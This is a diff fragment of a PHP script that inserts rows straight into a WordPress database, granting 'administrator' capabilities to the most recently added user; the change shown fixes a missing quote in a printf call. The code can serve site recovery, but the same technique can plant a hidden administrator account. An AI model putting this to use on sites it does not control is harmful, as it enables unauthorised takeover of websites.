@@ -28,7 +28,7 @@ if ($mysqli->query($q) === TRUE) {
 $q = "INSERT INTO `".$table_prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
 VALUES (NULL, (Select max(id) FROM ".$table_prefix."users), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');";
 if ($mysqli->query($q) === TRUE) {
-                printf("INSERT OK<br />);
+                printf("INSERT OK<br />");
 }
 
 $q = "INSERT INTO `".$table_prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
